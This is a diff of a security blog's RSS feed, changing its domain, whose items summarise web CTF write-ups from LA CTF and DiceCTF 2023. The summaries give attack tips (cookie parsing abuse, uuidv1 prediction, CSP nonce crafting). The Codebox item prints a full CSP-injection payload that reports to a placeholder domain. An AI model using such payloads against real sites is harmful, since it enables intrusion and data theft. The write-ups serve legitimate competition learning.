@@ -1,15 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
-        <title>web - Tag - My Blog</title>
-        <link>http://r0h1t.me/blog/tags/web/</link>
-        <description>web - Tag - My Blog</description>
+        <title>Web - Tag - My Blog</title>
+        <link>http://lu513n.com/blog/tags/web/</link>
+        <description>Web - Tag - My Blog</description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>rohitnanu.m@gmail.com (Rohit)</managingEditor>
-            <webMaster>rohitnanu.m@gmail.com (Rohit)</webMaster><lastBuildDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</lastBuildDate><atom:link href="http://r0h1t.me/blog/tags/web/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>rohitnanu.m@gmail.com (Rohit)</webMaster><lastBuildDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</lastBuildDate><atom:link href="http://lu513n.com/blog/tags/web/" rel="self" type="application/rss+xml" /><item>
     <title>hptla - LA CTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/hptla/</link>
+    <link>http://lu513n.com/blog/posts/hptla/</link>
     <pubDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/hptla/</guid>
+                </author><guid>http://lu513n.com/blog/posts/hptla/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>We can join the two lines either by adding a ` or starting a comment <code>/*</code> at the end of one line and closing it <code>*\</code> at the start of the next line</li>
@@ -39,10 +39,10 @@
 </span></span></code></pre></div>]]></description>
 </item><item>
     <title>queue up - LA CTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/queue-up/</link>
+    <link>http://lu513n.com/blog/posts/queue-up/</link>
     <pubDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/queue-up/</guid>
+                </author><guid>http://lu513n.com/blog/posts/queue-up/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>Find the flag server <code>qu-flag.lac.tf</code></li>
@@ -51,10 +51,10 @@
 </ul>]]></description>
 </item><item>
     <title>uuid hell - LA CTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/uuid-hell/</link>
+    <link>http://lu513n.com/blog/posts/uuid-hell/</link>
     <pubDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/uuid-hell/</guid>
+                </author><guid>http://lu513n.com/blog/posts/uuid-hell/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>It uses uuidv1 which is time-based</li>
@@ -66,10 +66,10 @@
 </ul>]]></description>
 </item><item>
     <title>Codebox - DiceCTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/codebox/</link>
+    <link>http://lu513n.com/blog/posts/codebox/</link>
     <pubDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/codebox/</guid>
+                </author><guid>http://lu513n.com/blog/posts/codebox/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>Use img src to inject csp</li>
@@ -80,10 +80,10 @@
 <p>Final Payload: <code>https://codebox.mc.ax/?code=&amp;code=&lt;img+src=&quot;*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/&quot;+&gt;</code></p>]]></description>
 </item><item>
     <title>Jnotes - DiceCTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/jnotes/</link>
+    <link>http://lu513n.com/blog/posts/jnotes/</link>
     <pubDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/jnotes/</guid>
+                </author><guid>http://lu513n.com/blog/posts/jnotes/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>Java mishandles the cookies such that when there is a cookie with a <code>&quot;</code>, it will take all the cookies until there is a <code>&quot;</code> as that cookie&rsquo;s value</li>
@@ -94,10 +94,10 @@
 </ul>]]></description>
 </item><item>
     <title>Recursive-csp - DiceCTF 2023</title>
-    <link>http://r0h1t.me/blog/posts/rescursive-csp/</link>
+    <link>http://lu513n.com/blog/posts/rescursive-csp/</link>
     <pubDate>Wed, 08 Feb 2023 00:00:00 &#43;0530</pubDate><author>
                     <name>Rohit</name>
-                </author><guid>http://r0h1t.me/blog/posts/rescursive-csp/</guid>
+                </author><guid>http://lu513n.com/blog/posts/rescursive-csp/</guid>
     <description><![CDATA[<h4 id="tldr" class="headerLink">
     <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
 <li>Craft a payload with a random nonce</li>
